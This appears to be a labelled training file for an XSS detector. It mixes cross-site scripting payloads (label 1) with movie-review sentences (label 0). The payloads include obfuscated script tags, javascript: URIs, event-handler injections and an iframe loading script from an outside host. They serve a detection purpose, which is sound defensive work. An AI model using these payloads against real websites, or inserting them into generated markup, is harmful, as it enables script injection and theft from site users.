label;sentence;1;;;;;;;;;;;;;;;;
1;"<IMG SRC=""javascript:alert('XSS');"">";;;;;;;;;;;;;;;;;
1;"<<script>alert(""xss"");//<</script>";;;;;;;;;;;;;;;;;
1;"<BODY ONLOAD!#$%&()*~+-_.,:;?@[/|\]^`=ALERT(""XSS"")>";;;;;;;;;;;;;;;;;
0;If it was to turn my good day feeling into a night of disturbing memories than I guess he succeeded.;;;;;;;;;;;;;;;;;
1;<IFRAME SRC=HTTP://HA.CKERS.ORG/SCRIPTLET.HTML <;;;;;;;;;;;;;;;;;
1;"<img src=""jav	ascript:alert('xss');"">";;;;;;;;;;;;;;;;;
0;No actress has been worse used that June Allison in this movie.;;;;;;;;;;;;;;;;;
0;When I saw it in the theater I thought I was going to be sick.;;;;;;;;;;;;;;;;;
1;<svg><script>alert(1)<p>;;;;;;;;;;;;;;;;;
0;Rating:  out of .;;;;;;;;;;;;;;;;;
0;Yet, I enjoy watching it.;;;;;;;;;;;;;;;;;
1;"';!--""<XSS>=&{()}";;;;;;;;;;;;;;;;;
0;Woa, talk about awful.;;;;;;;;;;;;;;;;;
0;And don't even get me started on the jerky camerawork.;;;;;;;;;;;;;;;;;
1;"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>";;;;;;;;;;;;;;;;;
1;"<img dynsrc=""javascript:alert('xss')"">";;;;;;;;;;;;;;;;;
1;&#39;;&#88;&#83;&#83;&#39;&#41;>;;;;;;;;;;
1;"\"";alert('XSS');//";;;;;;;;;;;;;;;;;
1;"</TITLE><SCRIPT>ALERT(""XSS"");</SCRIPT>";;;;;;;;;;;;;;;;;
1;#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>;;;;;;;;;;;;;;;;;
1;<SVG><scRipt>aLERT(1)<P>;;;;;;;;;;;;;;;;;
0;This would not even be good as a made for TV flick.;;;;;;;;;;;;;;;;;
1;"<iMg ONmOUseOVER=""aLeRt('XXS')"">";;;;;;;;;;;;;;;;;
1;"<img src=`jAvAscRiPt:aLERT(""RsNAkE says, 'XSS'"")`>";;;;;;;;;;;;;;;;;
0;The worst, sappiest dialogue... I could go on and on.;;;;;;;;;;;;;;;;;
0;This is a chilly, unremarkable movie about an author living/working in a chilly abstruse culture.;;;;;;;;;;;;;;;;;
1;<svg><script>alert(1)<p>;;;;;;;;;;;;;;;;;
1;"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>";;;;;;;;;;;;;;;;;
1;"<img src=""jav&#x0a;ascript:alert('xss');"">";;;;;;;;;;;;;;;;;
1;"<INPut tyPe=""IMagE"" SRC=""JaVasCRipt:alerT('xSS');"">";;;;;;;;;;;;;;;;;
0;It is an excellent drama, an excellent thriller, and an excellent film.;;;;;;;;;;;;;;;;;
1;<img src=javascript:alert(string.fromcharcode(88,83,83))>;;;;;;;;;;;;;;;;;
